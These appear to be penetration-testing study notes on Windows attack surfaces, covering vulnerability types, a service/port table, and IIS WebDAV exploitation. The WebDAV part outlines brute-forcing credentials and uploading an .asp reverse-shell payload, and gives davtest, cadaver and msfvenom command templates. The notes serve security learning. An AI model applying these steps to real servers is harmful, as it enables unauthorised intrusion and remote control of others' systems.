# 🪟 Windows Attacks

## Windows Vulnerabilities

[Windows O.S.](https://www.microsoft.com/en-us/windows) is a prime target for attackers given the threat surface and its popularity.

Most of the Windows vulnerabilities **exploits** are publicly available, making them simple to use.

- Threat surface is fragmented, depending on the Win O.S. version.
- The older the O.S. version, the more vulnerable to attacks.
- All of Windows operating systems share a similarity according to the development model.
  - `C` programming language - leads to buffer overflows, arbitrary code execution, etc
  - No default security practices applied - must be sistematically handled by the company
  - Patching by Microsoft is not immediate, or versions are out of support/patching
- To name a few, Windows `XP`, `7`, `Server 2008` and Server 2012, are still used by many companies and are *largerly vulnerable*, leaving the systems open to new attack vectors.
  - Cross platform vulnerabilities, `e.g.` SQL injections, cross-site scripting (on IIS web servers)
- Physical attacks, `e.g.` malicious USB drives, theft, etc

### Vulns Types

**`Information Disclosure`** -  allows an attacker to access confidential data

**`Buffer Overflows`** - programming error that allows an attacker to write data to a buffer and overrun the allocated buffer, therefore writing malicious data to allocated memory addresses

**`Remote Code Execution (RCE)`** - allows an attacker to remotely execute code on the target

**`Privilege Escalation`** - allows an attacker to elevate their privileges after initial compromise

**`Denial of Service (DoS)`** - allows an attacker to flood a target consuming its resources (CPU, RAM, Network ...), interrupting the system's normal functioning, resulting in denial of service to other users

## Services Exploitation

Windows has various standard native services and protocols configured or not on a host. When active, they provide an attacker with an **access vector**.

| Protocol/Service                                             | Ports                                   | Purpose                                                      |
| ------------------------------------------------------------ | --------------------------------------- | ------------------------------------------------------------ |
| [Microsoft **IIS**](https://www.iis.net/) (**I**nternet **I**nformation **S**ervices) | TCP `80`/`443`                          | Microsoft Web server for Windows, hosting web applications   |
| [**WebDAV**](https://learn.microsoft.com/en-us/windows/win32/webdav/webdav-portal) (**W**eb **D**istributed **A**uthoring & **V**ersioning) | TCP `80`/`443`                          | HTTP extension that allows clients to copy, move, delete and update files on a web server. Used to enable a web server to act as a *file server* |
| [**SMB**](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview)/CIFS (**S**erver **M**essage **B**lock) | TCP `445` / on top of NetBios `137-139` | Network file and peripherals sharing protocol, betweend computers on a local network (LAN) |
| [**RDP**](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (**R**emote **D**esktop **P**rotocol) | TCP `3389`                              | GUI remote access protocol used to remotely authenticate and interact with Windows *(Disabled by default)* |
| [**WinRM**](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) (**W**indows **R**emote **M**anagement **P**rotocol) | TCP `5986`/`443`                        | Used to facilitate remote access with Windows systems, execute remote commands |

### IIS WebDAV

🗒️ [Microsoft **IIS**](https://www.iis.net/) (**I**nternet **I**nformation **S**ervices) - a Microsoft proprietary extensible web server developed for use with Windows.

- Ports: **`80`** (no certificate), **`443`** (with SSL Certificate)
- Host websites and web applications
- Administrative GUI for IIS management
-  Static and dynamic web pages, developed in `ASP.NET` and `PHP`
- Supported file extensions: `.asp`, `.aspx`, `.config`, `.php`

🗒️ [**WebDAV**](https://learn.microsoft.com/en-us/windows/win32/webdav/webdav-portal) (**W**eb **D**istributed **A**uthoring & **V**ersioning) - a set of HTTP protocol extentions used by users to manage file on remote web servers.

- Web server as `File server`
- Runs on top of Apache or IIS - ports `80`/`443`
- Credentials, `username` & `password`, are necessary for connection the WebDAV server

#### WebDAV Exploitation

1. Check *if WebDAV is configured* to run on the IIS web server.
2. **Brute-force attack** on the WebDAV server - *identify legitimate credentials*.
3. Use the obtained credentials to *authenticate with the WebDAV* and upload malicious code, like an `.asp` **payload**, used to execute arbitrary commands or obtain **reverse shell** on the target.

#### Tools

> [**`davtest`**](https://www.kali.org/tools/davtest) - scanner tool used to *scan, authenticate and exploit a WebDAV server, by uploading test executable files which allow for command execution on the target.* Pre-installed on Kali Linux and Parrot OS.

```bash
davtest -url <URL>
```

> [**`cadaver`**](https://www.kali.org/tools/cadaver/) - supports file *upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking*. Pre-installed on Kali Linux and Parrot OS.

```bash
cadaver [OPTIONS] <URL>
```

> [**`msfvenom`**](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder

```bash
msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<PORT> -f <file_type> > shell.asp
```
